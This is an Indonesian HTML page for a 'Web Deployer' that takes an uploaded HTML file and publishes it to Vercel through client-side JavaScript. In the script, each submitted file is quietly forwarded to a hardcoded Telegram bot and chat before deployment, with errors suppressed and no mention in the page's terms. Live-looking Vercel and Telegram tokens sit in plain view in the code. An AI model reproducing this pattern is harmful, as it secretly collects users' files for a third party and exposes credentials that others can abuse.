<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Buat Website - Sendy</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
  
  <style>
    /* --- CSS BACKGROUND BARU --- */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #000000, #0a0a0a, #0d1b2a);
      color: #a8b0b9;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow-x: hidden;
    }

    .cyber-grid {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background:
        linear-gradient(rgba(173,216,230,0.07) 1px, transparent 1px),
        linear-gradient(90deg, rgba(173,216,230,0.07) 1px, transparent 1px);
      background-size: 30px 30px;
      z-index: 0;
      pointer-events: none;
    }

    #particles { position: fixed; inset: 0; z-index: 1; pointer-events: none; }

    .neon-border {
      position: fixed; inset: 0;
      border: 2px solid rgba(180,200,210,0.25);
      box-shadow: inset 0 0 50px rgba(0,191,255,0.15);
      z-index: 2;
      pointer-events: none;
    }

    /* --- PENYESUAIAN KONTEN ASLI --- */
    .container {
      position: relative;
      z-index: 10; /* Agar berada di atas background */
      max-width: 480px;
      width: 90%;
      margin: 40px auto;
      background: rgba(15, 15, 20, 0.9);
      backdrop-filter: blur(10px);
      padding: 24px;
      border-radius: 16px;
      border: 1px solid rgba(0, 168, 204, 0.3);
      box-shadow: 0 0 30px rgba(0,0,0,0.8);
    }

    h2 {
      text-align: center;
      font-size: 22px;
      color: #00a8cc;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      margin-bottom: 24px;
      text-shadow: 0 0 10px rgba(0, 168, 204, 0.5);
    }

    label {
      display: block;
      margin: 12px 0 4px;
      font-size: 14px;
      color: #a9f1df;
    }

    input[type="text"],
    input[type="file"] {
      width: 100%;
      padding: 12px;
      font-size: 14px;
      border-radius: 10px;
      border: 1px solid #333;
      background-color: rgba(42, 42, 42, 0.6);
      color: #fff;
      box-sizing: border-box;
      transition: 0.3s;
    }

    input:focus {
      outline: none;
      border-color: #00a8cc;
      box-shadow: 0 0 10px rgba(0, 168, 204, 0.3);
    }

    button {
      width: 100%;
      padding: 14px;
      font-size: 14px;
      border-radius: 10px;
      border: none;
      margin-top: 18px;
      background: linear-gradient(45deg, #a9f1df, #00a8cc);
      color: #000;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      text-transform: uppercase;
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 168, 204, 0.4);
    }

    #result {
      margin-top: 20px;
      text-align: center;
      font-size: 13px;
      color: #00ffff;
      font-weight: bold;
    }

    .footer {
      margin-top: 30px;
      font-size: 13px;
      background-color: rgba(24, 24, 24, 0.8);
      padding: 18px;
      border-radius: 12px;
      border-top: 1px solid #333;
    }

    .footer h4 {
      margin-bottom: 8px;
      font-size: 14px;
      color: #a9f1df;
    }

    .footer ul {
      list-style: none;
      padding: 0;
      margin: 0 0 12px 0;
    }

    .footer li { margin-bottom: 6px; color: #ccc; }

    .footer a {
      color: #00ffff;
      text-decoration: none;
    }

    .created-by {
      text-align: center;
      margin-top: 16px;
      font-size: 11px;
      color: #555;
    }
  </style>
</head>
<body>

  <div class="cyber-grid"></div>
  <div id="particles"></div>
  <div class="neon-border"></div>

  <div class="container">
    <h2>üöÄ Web Deployer</h2>

    <form id="deployForm">
      <label>Nama Website</label>
      <input type="text" id="siteName" placeholder="contoh: jembut.yonzbauk" required>

      <label>Upload File HTML</label>
      <input type="file" id="htmlFile" accept=".html" required>

      <button type="submit">GAS BUATü§§üí¶</button>
    </form>

    <div id="result"></div>

    <div class="footer">
      <h4>üìå Syarat & Ketentuan</h4>
      <ul>
        <li>File wajib bernama <strong>index.html</strong>.</li>
        <li>Tidak boleh konten ilegal/phishing.</li>
        <li>Website bersifat publik & gratis.</li>
      </ul>

      <h4>üìû Kontak Admin</h4>
      <ul>
        <li>WhatsApp: <a href="https://wa.me/6285361384443" target="_blank">Owner Web</a></li>
        <li>Telegram: <a href="https://t.me/Yonzganteng" target="_blank">Owner Web</a></li>
        <li>Channel: <a href="https://t.me/yahahahdgx" target="_blank">Channel Kami</a></li>
      </ul>

      <div class="created-by">üåê Powered by <strong>Vercel Engine</strong></div>
    </div>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <script>
    // Inisialisasi Partikel
    document.addEventListener('DOMContentLoaded', function () {
      particleground(document.getElementById('particles'), {
        dotColor: '#a9f1df',
        lineColor: '#00a8cc',
        density: 10000,
        particleRadius: 3,
        lineWidth: 1,
        curvedLines: true
      });
    });

    // --- LOGIKA ASLI ANDA (TIDAK DIUBAH) ---
    const vercelToken = "sEqRS5cyUC0H4qzgBxvu7J6L"; 
    const telegramBotToken = "8368385066:AAFRhqz2GchiFDlM5QFUVRjHiIzjdvx8WVI";
    const chatId = "7283415806";

    document.getElementById("deployForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      const siteName = document.getElementById("siteName").value.trim();
      const fileInput = document.getElementById("htmlFile");
      const resultDiv = document.getElementById("result");

      if (!siteName || fileInput.files.length === 0) {
        alert("Isi nama dan upload file HTML!");
        return;
      }

      const file = fileInput.files[0];
      resultDiv.innerHTML = "üì§ proses...";

      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("caption", `üìÑ File HTML baru dari: ${siteName}`);
      formData.append("document", file);

      try {
        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument`, {
          method: "POST",
          body: formData
        });
      } catch (err) {}

      resultDiv.innerHTML = "‚è≥ Membuat project di Vercel...";

      try {
        await fetch("https://api.vercel.com/v10/projects", {
          method: "POST",
          headers: {
            Authorization: `Bearer ${vercelToken}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ name: siteName, framework: null })
        });
      } catch (err) {}

      const htmlText = await file.text();
      resultDiv.innerHTML = "üöÄ Deploying ke Vercel...";

      const payload = {
        name: siteName,
        project: siteName,
        target: "production",
        files: [{ file: "index.html", data: htmlText }],
        projectSettings: { framework: null }
      };

      try {
        const response = await fetch("https://api.vercel.com/v13/deployments", {
          method: "POST",
          headers: {
            Authorization: `Bearer ${vercelToken}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });

        const data = await response.json();
        if (data.url) {
          resultDiv.innerHTML = `‚úÖ Berhasil:<br><a href="https://${siteName}.vercel.app" target="_blank">https://${siteName}.vercel.app</a>`;
        } else {
          resultDiv.innerHTML = `‚ùå Gagal: ${data.error?.message || "Error"}`;
        }
      } catch (err) {
        resultDiv.innerHTML = "‚ùå Koneksi gagal.";
      }
    });
  </script>
</body>
</html>
